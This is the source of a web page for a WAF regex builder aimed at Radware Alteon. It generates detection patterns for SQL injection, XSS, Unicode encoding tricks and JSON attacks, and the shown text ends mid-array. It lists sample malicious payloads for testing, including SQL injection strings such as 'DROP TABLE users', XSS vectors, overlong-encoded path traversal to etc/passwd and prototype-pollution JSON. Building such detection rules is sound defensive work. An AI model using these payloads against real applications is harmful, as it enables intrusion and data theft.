<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Radware Alteon WAF Regex Builder Pro - Advanced Edition</title>
    
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --alteon-blue: #0052cc;
            --alteon-dark: #003d99;
            --alteon-light: #e6f2ff;
            --success: #10b981;
            --warning: #f59e0b;
            --danger: #ef4444;
            --gray-50: #f9fafb;
            --gray-100: #f3f4f6;
            --gray-600: #4b5563;
            --gray-800: #1f2937;
        }

        * { font-family: 'Inter', sans-serif; }
        .mono { font-family: 'JetBrains Mono', monospace; }
        
        body { 
            background: linear-gradient(135deg, #f9fafb 0%, #e5e7eb 100%);
            min-height: 100vh;
        }
        
        .container { max-width: 1600px; margin: 0 auto; }
        
        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            border: 1px solid #e5e7eb;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 16px;
            border-radius: 8px;
            font-weight: 500;
            transition: all 0.2s;
            cursor: pointer;
            border: none;
            text-decoration: none;
        }
        
        .btn-primary {
            background: var(--alteon-blue);
            color: white;
        }
        
        .btn-primary:hover {
            background: var(--alteon-dark);
            transform: translateY(-1px);
        }
        
        .btn-secondary {
            background: var(--gray-100);
            color: var(--gray-600);
        }
        
        .btn-secondary:hover {
            background: #e5e7eb;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .attack-card {
            padding: 20px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .attack-card:hover {
            border-color: var(--alteon-blue);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0, 82, 204, 0.15);
        }
        
        .attack-card.selected {
            border-color: var(--alteon-blue);
            background: var(--alteon-light);
        }
        
        .pattern-chip {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 12px;
            background: #f3f4f6;
            border: 1px solid #d1d5db;
            border-radius: 20px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
            margin: 2px;
        }
        
        .pattern-chip:hover {
            border-color: var(--alteon-blue);
            background: var(--alteon-light);
        }
        
        .pattern-chip.active {
            background: var(--alteon-blue);
            color: white;
            border-color: var(--alteon-blue);
        }
        
        .regex-output {
            background: #1e293b;
            color: #e2e8f0;
            padding: 24px;
            border-radius: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            line-height: 1.6;
            position: relative;
            min-height: 120px;
            word-break: break-all;
        }
        
        .copy-btn {
            position: absolute;
            top: 12px;
            right: 12px;
            background: #374151;
            color: white;
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .copy-btn:hover { background: #4b5563; }
        .copy-btn.copied { background: var(--success); }
        
        .test-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            transition: all 0.2s;
        }
        
        .test-input:focus {
            outline: none;
            border-color: var(--alteon-blue);
        }
        
        .test-result {
            padding: 12px;
            border-radius: 8px;
            font-weight: 500;
            margin-top: 8px;
        }
        
        .test-match { background: #dcfce7; color: #166534; }
        .test-no-match { background: #fee2e2; color: #991b1b; }
        
        .severity-critical { color: var(--danger); }
        .severity-high { color: #ea580c; }
        .severity-medium { color: var(--warning); }
        .severity-low { color: var(--success); }
        
        .tab {
            padding: 12px 24px;
            border-radius: 8px 8px 0 0;
            cursor: pointer;
            background: #f3f4f6;
            color: var(--gray-600);
            transition: all 0.2s;
            border-bottom: 2px solid transparent;
        }
        
        .tab.active {
            background: white;
            color: var(--alteon-blue);
            border-bottom-color: var(--alteon-blue);
        }
        
        .payload-item {
            padding: 8px 12px;
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.2s;
            word-break: break-all;
        }
        
        .payload-item:hover {
            border-color: var(--alteon-blue);
            background: var(--alteon-light);
        }
        
        .payload-item.selected {
            background: var(--alteon-blue);
            color: white;
            border-color: var(--alteon-blue);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
        }
        
        .stat-card {
            padding: 16px;
            background: white;
            border-radius: 8px;
            text-align: center;
            border: 1px solid #e5e7eb;
        }
        
        .loading { opacity: 0.6; pointer-events: none; }
        
        .regex-preview {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 16px;
            margin-top: 12px;
        }
        
        .export-format {
            background: #1e293b;
            color: #e2e8f0;
            padding: 20px;
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.5;
            white-space: pre-wrap;
            overflow-x: auto;
        }
        
        .floating-panel {
            position: fixed;
            top: 50%;
            right: 20px;
            transform: translateY(-50%);
            width: 300px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            transition: all 0.3s;
        }
        
        .floating-panel.collapsed {
            transform: translateY(-50%) translateX(280px);
        }
        
        .toggle-panel {
            position: absolute;
            left: -40px;
            top: 50%;
            transform: translateY(-50%);
            background: var(--alteon-blue);
            color: white;
            width: 40px;
            height: 60px;
            border-radius: 8px 0 0 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .attack-type-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }
        
        .pattern-categories {
            max-height: 400px;
            overflow-y: auto;
            padding-right: 10px;
        }
        
        .pattern-categories::-webkit-scrollbar {
            width: 6px;
        }
        
        .pattern-categories::-webkit-scrollbar-track {
            background: #f1f5f9;
            border-radius: 3px;
        }
        
        .pattern-categories::-webkit-scrollbar-thumb {
            background: #cbd5e1;
            border-radius: 3px;
        }
        
        .pattern-categories::-webkit-scrollbar-thumb:hover {
            background: #94a3b8;
        }

        .difficulty-toggle {
            display: flex;
            gap: 8px;
            padding: 4px;
            background: #f3f4f6;
            border-radius: 8px;
            margin-left: auto;
        }

        .difficulty-btn {
            padding: 6px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .difficulty-btn.active {
            background: var(--alteon-blue);
            color: white;
        }

        .preset-selector {
            margin-bottom: 20px;
            padding: 16px;
            background: #f8fafc;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
        }

        .preset-btn {
            padding: 10px 16px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            background: white;
            cursor: pointer;
            transition: all 0.2s;
            margin: 4px;
        }

        .preset-btn:hover {
            border-color: var(--alteon-blue);
            background: var(--alteon-light);
        }

        .preset-btn.active {
            border-color: var(--alteon-blue);
            background: var(--alteon-blue);
            color: white;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="bg-white shadow-lg border-b-4 border-blue-600">
        <div class="container px-6 py-6">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-gradient-to-br from-blue-600 to-blue-700 rounded-xl flex items-center justify-center text-white">
                        <i class="fas fa-shield-alt text-xl"></i>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold text-gray-800">Alteon WAF Regex Builder Pro - Advanced Edition</h1>
                        <p class="text-gray-600">Comprehensive security pattern generator with advanced attack detection</p>
                    </div>
                </div>
                
                <div class="flex items-center gap-3">
                    <div class="difficulty-toggle">
                        <button class="difficulty-btn active" data-level="basic" onclick="setDifficulty('basic')">Basic</button>
                        <button class="difficulty-btn" data-level="advanced" onclick="setDifficulty('advanced')">Advanced</button>
                        <button class="difficulty-btn" data-level="expert" onclick="setDifficulty('expert')">Expert</button>
                    </div>
                    <button class="btn btn-secondary" onclick="showHelp()">
                        <i class="fas fa-question-circle"></i>
                        Help
                    </button>
                    <button class="btn btn-secondary" onclick="resetAll()">
                        <i class="fas fa-refresh"></i>
                        Reset
                    </button>
                    <button class="btn btn-primary" onclick="exportConfig()">
                        <i class="fas fa-download"></i>
                        Export Config
                    </button>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="container px-6 py-8">
        <!-- Quick Presets -->
        <div class="preset-selector">
            <h3 class="text-lg font-bold mb-3">Quick Configuration Presets</h3>
            <div class="flex flex-wrap gap-2">
                <button class="preset-btn" onclick="applyPreset('web-basic')">
                    <i class="fas fa-globe"></i> Basic Web Protection
                </button>
                <button class="preset-btn" onclick="applyPreset('api-security')">
                    <i class="fas fa-code"></i> API Security
                </button>
                <button class="preset-btn" onclick="applyPreset('high-security')">
                    <i class="fas fa-lock"></i> High Security
                </button>
                <button class="preset-btn" onclick="applyPreset('owasp-top10')">
                    <i class="fas fa-certificate"></i> OWASP Top 10
                </button>
                <button class="preset-btn" onclick="applyPreset('file-upload')">
                    <i class="fas fa-upload"></i> File Upload Protection
                </button>
                <button class="preset-btn" onclick="applyPreset('json-api')">
                    <i class="fas fa-brackets-curly"></i> JSON/REST API
                </button>
            </div>
        </div>

        <!-- Attack Type Selection -->
        <div class="card p-6 mb-8">
            <div class="flex items-center justify-between mb-6">
                <div>
                    <h2 class="text-xl font-bold text-gray-800 mb-2">Security Threats to Protect Against</h2>
                    <p class="text-gray-600">Select attack types to generate comprehensive regex patterns for your Alteon WAF</p>
                </div>
                <div class="text-sm text-gray-500">
                    <span id="selectedCount">0</span> of <span id="totalCount">22</span> selected
                </div>
            </div>
            
            <div class="attack-type-grid" id="attackTypes">
                <!-- Attack types will be populated by JavaScript -->
            </div>
        </div>

        <!-- Pattern Builder & Live Preview -->
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <!-- Pattern Components -->
            <div class="lg:col-span-2">
                <div class="card p-6">
                    <div class="flex items-center justify-between mb-6">
                        <h3 class="text-lg font-bold text-gray-800">Pattern Components</h3>
                        <div class="flex gap-2">
                            <button class="btn btn-secondary btn-sm" onclick="selectAllPatterns()">
                                <i class="fas fa-check-double"></i>
                                Select All
                            </button>
                            <button class="btn btn-secondary btn-sm" onclick="clearAllPatterns()">
                                <i class="fas fa-times"></i>
                                Clear All
                            </button>
                        </div>
                    </div>
                    
                    <div class="pattern-categories" id="patternCategories">
                        <div class="text-center text-gray-500 py-8">
                            <i class="fas fa-arrow-up text-2xl mb-3"></i>
                            <p>Select attack types above to see available patterns</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Live Regex Output -->
            <div>
                <div class="card p-6 sticky top-8">
                    <h3 class="text-lg font-bold text-gray-800 mb-4">Generated Regex Pattern</h3>
                    
                    <div class="regex-output" id="regexOutput">
                        <button class="copy-btn" onclick="copyRegex()">
                            <i class="fas fa-copy"></i>
                            Copy
                        </button>
                        <div id="regexPattern">Select patterns to generate regex...</div>
                    </div>
                    
                    <!-- Pattern Statistics -->
                    <div class="mt-4 p-4 bg-gray-50 rounded-lg">
                        <div class="stats-grid text-sm">
                            <div class="stat-card">
                                <div class="text-2xl font-bold text-blue-600" id="patternCount">0</div>
                                <div class="text-gray-600">Patterns</div>
                            </div>
                            <div class="stat-card">
                                <div class="text-2xl font-bold text-green-600" id="complexityScore">Low</div>
                                <div class="text-gray-600">Complexity</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Quick Options -->
                    <div class="mt-4 space-y-3">
                        <h4 class="font-medium text-gray-700">Pattern Options</h4>
                        
                        <label class="flex items-center gap-2 cursor-pointer">
                            <input type="checkbox" id="caseInsensitive" onchange="updateRegex()" class="rounded">
                            <span class="text-sm">Case insensitive matching</span>
                        </label>
                        
                        <label class="flex items-center gap-2 cursor-pointer">
                            <input type="checkbox" id="multiline" onchange="updateRegex()" class="rounded">
                            <span class="text-sm">Multiline mode</span>
                        </label>
                        
                        <label class="flex items-center gap-2 cursor-pointer">
                            <input type="checkbox" id="wordBoundaries" onchange="updateRegex()" class="rounded">
                            <span class="text-sm">Add word boundaries</span>
                        </label>
                        
                        <button class="btn btn-primary w-full mt-4" onclick="optimizeRegex()">
                            <i class="fas fa-magic"></i>
                            Optimize Pattern
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Testing Panel -->
        <div class="card p-6 mt-8">
            <h3 class="text-lg font-bold text-gray-800 mb-4">Pattern Testing</h3>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Test Input</label>
                    <textarea 
                        id="testInput" 
                        class="test-input h-32" 
                        placeholder="Enter text to test against your regex pattern..."
                        oninput="testRegex()"
                    ></textarea>
                    
                    <div class="mt-4">
                        <h4 class="text-sm font-medium text-gray-700 mb-2">Sample Malicious Payloads</h4>
                        <div class="space-y-2 max-h-40 overflow-y-auto" id="samplePayloads">
                            <!-- Sample payloads will be populated by JavaScript -->
                        </div>
                    </div>
                </div>
                
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Test Results</label>
                    <div id="testResults" class="test-result test-no-match">
                        No test input provided
                    </div>
                    
                    <div class="mt-4">
                        <h4 class="text-sm font-medium text-gray-700 mb-2">Match Details</h4>
                        <div id="matchDetails" class="bg-gray-50 p-4 rounded-lg text-sm">
                            Test your pattern to see match details
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Export Configuration -->
        <div class="card p-6 mt-8">
            <h3 class="text-lg font-bold text-gray-800 mb-4">Export Configuration</h3>
            
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div>
                    <h4 class="font-medium text-gray-700 mb-3">Configuration Details</h4>
                    
                    <div class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Rule Name</label>
                            <input type="text" id="ruleName" class="test-input" placeholder="WAF_SECURITY_RULE_001">
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Description</label>
                            <textarea id="ruleDescription" class="test-input h-20" placeholder="Blocks common web application attacks"></textarea>
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Severity</label>
                            <select id="ruleSeverity" class="test-input">
                                <option value="high">High</option>
                                <option value="medium">Medium</option>
                                <option value="low">Low</option>
                                <option value="critical">Critical</option>
                            </select>
                        </div>
                        
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Action</label>
                            <select id="ruleAction" class="test-input">
                                <option value="block">Block</option>
                                <option value="challenge">Challenge</option>
                                <option value="log">Log Only</option>
                                <option value="redirect">Redirect</option>
                            </select>
                        </div>
                    </div>
                </div>
                
                <div>
                    <div class="flex items-center gap-2 mb-3">
                        <h4 class="font-medium text-gray-700">Export Format</h4>
                        <div class="flex gap-1">
                            <button class="tab active" data-format="alteon" onclick="selectExportFormat('alteon')">Alteon CLI</button>
                            <button class="tab" data-format="appwall" onclick="selectExportFormat('appwall')">AppWall</button>
                            <button class="tab" data-format="json" onclick="selectExportFormat('json')">JSON</button>
                        </div>
                    </div>
                    
                    <div class="export-format" id="exportOutput">
                        # Select patterns and configure details to generate export
                    </div>
                    
                    <div class="flex gap-3 mt-4">
                        <button class="btn btn-primary flex-1" onclick="copyExport()">
                            <i class="fas fa-copy"></i>
                            Copy Configuration
                        </button>
                        <button class="btn btn-secondary flex-1" onclick="downloadExport()">
                            <i class="fas fa-download"></i>
                            Download File
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Floating Quick Stats Panel -->
    <div class="floating-panel" id="floatingPanel">
        <div class="toggle-panel" onclick="togglePanel()">
            <i class="fas fa-chart-bar"></i>
        </div>
        <div class="p-4">
            <h4 class="font-bold text-gray-800 mb-3">Pattern Statistics</h4>
            <div class="space-y-2 text-sm">
                <div class="flex justify-between">
                    <span>Active Patterns:</span>
                    <span class="font-bold" id="activePatternsCount">0</span>
                </div>
                <div class="flex justify-between">
                    <span>Attack Types:</span>
                    <span class="font-bold" id="activeAttackTypesCount">0</span>
                </div>
                <div class="flex justify-between">
                    <span>Regex Length:</span>
                    <span class="font-bold" id="regexLength">0</span>
                </div>
                <div class="flex justify-between">
                    <span>Performance:</span>
                    <span class="font-bold" id="performanceScore">-</span>
                </div>
            </div>
            
            <div class="mt-4 pt-3 border-t">
                <button class="btn btn-primary w-full btn-sm" onclick="generateReport()">
                    <i class="fas fa-file-alt"></i>
                    Generate Report
                </button>
            </div>
        </div>
    </div>

    <script>
        // Enhanced attack patterns with all requested categories
        const attackPatterns = {
            // Original categories
            sqli: {
                name: 'SQL Injection',
                icon: 'fas fa-database',
                color: 'red',
                severity: 'critical',
                description: 'Prevent database attacks and data exfiltration',
                categories: {
                    'Basic SQL': [
                        { pattern: '(?i)\\bunion\\b', display: 'UNION', desc: 'Union operator for data extraction', severity: 'high' },
                        { pattern: '(?i)\\bselect\\b', display: 'SELECT', desc: 'Data selection statements', severity: 'high' },
                        { pattern: '(?i)\\binsert\\b', display: 'INSERT', desc: 'Data insertion attempts', severity: 'medium' },
                        { pattern: '(?i)\\bupdate\\b', display: 'UPDATE', desc: 'Data modification attempts', severity: 'medium' },
                        { pattern: '(?i)\\bdelete\\b', display: 'DELETE', desc: 'Data deletion attempts', severity: 'high' },
                        { pattern: '(?i)\\bdrop\\b', display: 'DROP', desc: 'Table/database deletion', severity: 'critical' }
                    ],
                    'SQL Operators': [
                        { pattern: '(?i)\\s+or\\s+\\d*\\s*=\\s*\\d*', display: 'OR 1=1', desc: 'Classic bypass condition', severity: 'critical' },
                        { pattern: '(?i)\\s+and\\s+\\d*\\s*=\\s*\\d*', display: 'AND 1=1', desc: 'Logic condition bypass', severity: 'high' },
                        { pattern: '--[\\s\\S]*$', display: 'SQL Comments', desc: 'Comment-based evasion', severity: 'medium' },
                        { pattern: '/\\*[\\s\\S]*?\\*/', display: 'Block Comments', desc: 'Multi-line comment injection', severity: 'medium' }
                    ],
                    'Advanced Techniques': [
                        { pattern: '(?i)\\bsleep\\s*\\(\\s*\\d+\\s*\\)', display: 'SLEEP()', desc: 'Time-based blind injection', severity: 'high' },
                        { pattern: '(?i)\\bbenchmark\\s*\\(', display: 'BENCHMARK()', desc: 'MySQL performance attack', severity: 'high' },
                        { pattern: '(?i)\\bwaitfor\\s+delay\\s+', display: 'WAITFOR DELAY', desc: 'MSSQL time delay attack', severity: 'high' },
                        { pattern: '(?i)\\bpg_sleep\\s*\\(', display: 'PG_SLEEP()', desc: 'PostgreSQL sleep function', severity: 'high' },
                        { pattern: '(?i)\\bload_file\\s*\\(', display: 'LOAD_FILE()', desc: 'File system access attempt', severity: 'critical' },
                        { pattern: '(?i)\\binto\\s+outfile\\b', display: 'INTO OUTFILE', desc: 'File write attempt', severity: 'critical' }
                    ],
                    'Encoded Injections': [
                        { pattern: '%27(?i:union|select|insert|update|delete)', display: 'URL Encoded SQL', desc: 'URL encoded SQL keywords', severity: 'high' },
                        { pattern: '\\\\x27(?i:union|select|insert)', display: 'Hex Encoded SQL', desc: 'Hex encoded SQL injection', severity: 'high' },
                        { pattern: '&#x27;(?i:union|select)', display: 'HTML Entity SQL', desc: 'HTML entity encoded SQL', severity: 'medium' }
                    ]
                },
                samples: [
                    "' OR '1'='1",
                    "admin'--",
                    "' UNION SELECT null,username,password FROM users--",
                    "'; DROP TABLE users;--",
                    "' OR SLEEP(5)--",
                    "' AND BENCHMARK(5000000,MD5(1))--"
                ]
            },
            xss: {
                name: 'Cross-Site Scripting (XSS)',
                icon: 'fas fa-code',
                color: 'orange',
                severity: 'high',
                description: 'Block script injection and client-side attacks',
                categories: {
                    'Script Tags': [
                        { pattern: '<\\s*script[^>]*>', display: '<script>', desc: 'Basic script tag detection', severity: 'high' },
                        { pattern: '</\\s*script\\s*>', display: '< /script>', desc: 'Closing script tag', severity: 'high' },
                        { pattern: '(?i)javascript\\s*:', display: 'javascript:', desc: 'JavaScript protocol handler', severity: 'high' },
                        { pattern: '(?i)vbscript\\s*:', display: 'vbscript:', desc: 'VBScript protocol handler', severity: 'medium' },
                        { pattern: '(?i)data\\s*:[^,]*base64', display: 'data:base64', desc: 'Base64 data URI scheme', severity: 'medium' }
                    ],
                    'Event Handlers': [
                        { pattern: '(?i)on\\w+\\s*=\\s*["\'][^"\']*["\']', display: 'Event Handlers', desc: 'HTML event attributes', severity: 'high' },
                        { pattern: '(?i)onclick\\s*=', display: 'onclick=', desc: 'Click event handler', severity: 'high' },
                        { pattern: '(?i)onload\\s*=', display: 'onload=', desc: 'Load event handler', severity: 'high' },
                        { pattern: '(?i)onerror\\s*=', display: 'onerror=', desc: 'Error event handler', severity: 'high' },
                        { pattern: '(?i)onmouseover\\s*=', display: 'onmouseover=', desc: 'Mouse event handler', severity: 'medium' },
                        { pattern: '(?i)onfocus\\s*=', display: 'onfocus=', desc: 'Focus event handler', severity: 'medium' }
                    ],
                    'Dangerous Tags': [
                        { pattern: '<\\s*iframe[^>]*>', display: '<iframe>', desc: 'Iframe inclusion attack', severity: 'high' },
                        { pattern: '<\\s*object[^>]*>', display: '<object>', desc: 'Object embedding attack', severity: 'high' },
                        { pattern: '<\\s*embed[^>]*>', display: '<embed>', desc: 'Content embedding attack', severity: 'high' },
                        { pattern: '<\\s*link[^>]*>', display: '<link>', desc: 'External resource linking', severity: 'medium' },
                        { pattern: '<\\s*meta[^>]*>', display: '<meta>', desc: 'Meta tag manipulation', severity: 'medium' },
                        { pattern: '<\\s*svg[^>]*>', display: '<svg>', desc: 'SVG-based XSS attack', severity: 'high' }
                    ],
                    'JavaScript Functions': [
                        { pattern: '(?i)alert\\s*\\(', display: 'alert()', desc: 'Alert dialog function', severity: 'medium' },
                        { pattern: '(?i)eval\\s*\\(', display: 'eval()', desc: 'Code evaluation function', severity: 'critical' },
                        { pattern: '(?i)document\\.cookie', display: 'document.cookie', desc: 'Cookie access attempt', severity: 'high' },
                        { pattern: '(?i)window\\.location', display: 'window.location', desc: 'Location manipulation', severity: 'high' },
                        { pattern: '(?i)settimeout\\s*\\(', display: 'setTimeout()', desc: 'Delayed execution function', severity: 'medium' },
                        { pattern: '(?i)setinterval\\s*\\(', display: 'setInterval()', desc: 'Repeated execution function', severity: 'medium' }
                    ],
                    'Encoded XSS': [
                        { pattern: '%3C(?i:script|iframe|object)', display: 'URL Encoded Tags', desc: 'URL encoded HTML tags', severity: 'high' },
                        { pattern: '&lt;(?i:script|iframe)', display: 'HTML Entity Tags', desc: 'HTML entity encoded tags', severity: 'medium' },
                        { pattern: '\\\\u003c(?i:script)', display: 'Unicode Encoded', desc: 'Unicode encoded script tags', severity: 'medium' }
                    ]
                },
                samples: [
                    "<script>alert('XSS')< /script>",
                    "javascript:ale rt('XSS')",
                    "<img src=x onerror=ale rt('XSS')>",
                    "<iframe src=javascript:al ert('XSS')></iframe>",
                    "';aler t('XSS');//",
                    "<svg onload=ale rt('XSS')>"
                ]
            },
            // New enhanced categories
            utf8unicode: {
                name: 'UTF8/Unicode Parsing',
                icon: 'fas fa-font',
                color: 'purple',
                severity: 'high',
                description: 'Detect UTF-8 and Unicode-based attacks and encoding bypass attempts',
                categories: {
                    'UTF-8 Overlong Encoding': [
                        { pattern: '%c0%af', display: 'UTF-8 Overlong /', desc: 'Overlong encoding of slash', severity: 'high' },
                        { pattern: '%e0%80%af', display: '3-byte Overlong /', desc: '3-byte overlong slash', severity: 'high' },
                        { pattern: '%f0%80%80%af', display: '4-byte Overlong /', desc: '4-byte overlong slash', severity: 'high' },
                        { pattern: '%c0%ae', display: 'UTF-8 Overlong .', desc: 'Overlong encoding of dot', severity: 'medium' },
                        { pattern: '%c1%9c', display: 'UTF-8 Overlong \\', desc: 'Overlong encoding of backslash', severity: 'high' },
                        { pattern: '%c0%80', display: 'NULL byte overlong', desc: 'Overlong NULL byte', severity: 'critical' }
                    ],
                    'Unicode Normalization': [
                        { pattern: '[\u00AD\u034F\u061C\u180E\u200B-\u200F\u202A-\u202E\u2060-\u2064\u206A-\u206F\uFEFF\uFFF9-\uFFFB]', display: 'Invisible Characters', desc: 'Zero-width and invisible Unicode', severity: 'high' },
                        { pattern: '[\uFE00-\uFE0F]', display: 'Variation Selectors', desc: 'Unicode variation selectors', severity: 'medium' },
                        { pattern: '[\u0300-\u036F]', display: 'Combining Diacriticals', desc: 'Combining diacritical marks', severity: 'medium' },
                        { pattern: '[\uE000-\uF8FF]', display: 'Private Use Area', desc: 'Unicode private use area', severity: 'low' },
                        { pattern: '[\uDB40-\uDBFF][\uDC00-\uDFFF]', display: 'Surrogate Pairs', desc: 'High/low surrogate pairs', severity: 'medium' }
                    ],
                    'Unicode Encoding Tricks': [
                        { pattern: '\\\\u[0-9a-fA-F]{4}', display: '\\uXXXX', desc: 'Unicode escape sequences', severity: 'medium' },
                        { pattern: '%u[0-9a-fA-F]{4}', display: '%uXXXX', desc: 'IIS Unicode encoding', severity: 'high' },
                        { pattern: '\\\\x[0-9a-fA-F]{2}', display: '\\xXX', desc: 'Hex escape sequences', severity: 'medium' },
                        { pattern: '&#x[0-9a-fA-F]+;', display: '&#xXXXX;', desc: 'HTML hex entities', severity: 'medium' },
                        { pattern: '&#[0-9]+;', display: '&#XXXX;', desc: 'HTML decimal entities', severity: 'medium' }
                    ],
                    'Bidirectional Text Attacks': [
                        { pattern: '[\u202A-\u202E]', display: 'BiDi Override', desc: 'Bidirectional text override', severity: 'high' },
                        { pattern: '[\u200E\u200F]', display: 'LTR/RTL Marks', desc: 'Left-to-right/right-to-left marks', severity: 'medium' },
                        { pattern: '[\u061C]', display: 'Arabic Letter Mark', desc: 'Arabic letter mark', severity: 'medium' },
                        { pattern: '[\u2066-\u2069]', display: 'Isolate Characters', desc: 'Directional isolate characters', severity: 'medium' }
                    ],
                    'Homograph Attacks': [
                        { pattern: '[а-яА-Я]', display: 'Cyrillic Characters', desc: 'Cyrillic look-alike characters', severity: 'medium' },
                        { pattern: '[αβγδεζηθικλμνξοπρστυφχψω]', display: 'Greek Characters', desc: 'Greek look-alike characters', severity: 'medium' },
                        { pattern: '[０-９Ａ-Ｚａ-ｚ]', display: 'Fullwidth Characters', desc: 'Fullwidth ASCII characters', severity: 'medium' }
                    ]
                },
                samples: [
                    "%c0%af%c0%af%c0%af%c0%afetc%c0%afpasswd",
                    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                    "\u202Emalicious.exe\u202Ctxt.jpg",
                    "pаypal.com", // 'a' is Cyrillic
                    "%e0%80%af%e0%80%af%e0%80%af",
                    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
                ]
            },
            jsonparsing: {
                name: 'JSON Parsing',
                icon: 'fas fa-brackets-curly',
                color: 'blue',
                severity: 'high',
                description: 'Protect against JSON injection and parsing vulnerabilities',
                categories: {
                    'JSON Structure Attacks': [
                        { pattern: '__proto__', display: '__proto__', desc: 'Prototype pollution attack', severity: 'critical' },
                        { pattern: 'constructor', display: 'constructor', desc: 'Constructor override attempt', severity: 'high' },
                        { pattern: 'prototype', display: 'prototype', desc: 'Prototype manipulation', severity: 'high' },
                        { pattern: '\\$where\\s*:', display: '$where', desc: 'MongoDB injection via JSON', severity: 'critical' },
                        { pattern: '\\$ne\\s*:', display: '$ne', desc: 'MongoDB not-equal operator', severity: 'high' }
                    ],
                    'JSON Injection Patterns': [
                        { pattern: '"\\s*[\\[\\{]', display: 'Nested JSON', desc: 'Nested JSON structure injection', severity: 'medium' },
                        { pattern: '\\}\\s*[^,\\]\\}]', display: 'Broken JSON', desc: 'JSON structure breaking', severity: 'medium' },
                        { pattern: '"\\s*:\\s*"[^"]*<[^>]+>', display: 'HTML in JSON', desc: 'HTML injection in JSON values', severity: 'high' },
                        { pattern: '"\\s*:\\s*"[^"]*(?:javascript|vbscript):', display: 'Script in JSON', desc: 'Script protocol in JSON', severity: 'high' }
                    ],
                    'JSON Unicode Attacks': [
                        { pattern: '\\\\u0000', display: '\\u0000', desc: 'NULL byte in JSON', severity: 'high' },
                        { pattern: '\\\\u[dD][89abAB][0-9a-fA-F]{2}', display: 'High Surrogates', desc: 'Unpaired high surrogates', severity: 'medium' },
                        { pattern: '\\\\u[dD][c-fC-F][0-9a-fA-F]{2}', display: 'Low Surrogates', desc: 'Unpaired low surrogates', severity: 'medium' },
                        { pattern: '\\\\u202[eE]', display: '\\u202E', desc: 'RTL override in JSON', severity: 'high' }
                    ],
                    'JSON Comment Injection': [
                        { pattern: '/\\*.*?\\*/', display: '/* Comments */', desc: 'C-style comments in JSON', severity: 'medium' },
                        { pattern: '//[^\\n]*', display: '// Comments', desc: 'Single-line comments in JSON', severity: 'medium' },
                        { pattern: '#[^\\n]*', display: '# Comments', desc: 'Hash comments in JSON', severity: 'low' }
                    ],
                    'Large Number Attacks': [
                        { pattern: ':\\s*\\d{16,}', display: 'Large Numbers', desc: 'Integer overflow attempts', severity: 'medium' },
                        { pattern: ':\\s*-?\\d+\\.\\d{100,}', display: 'High Precision', desc: 'Denial of service via precision', severity: 'medium' },
                        { pattern: ':\\s*\\d+[eE][+-]?\\d{3,}', display: 'Scientific Notation', desc: 'Large exponent DoS', severity: 'medium' }
                    ]
                },
                samples: [
                    '{"__proto__": {"isAdmin": true}}',
                    '{"constructor": {"prototype": {"isAdmin": true}}}',
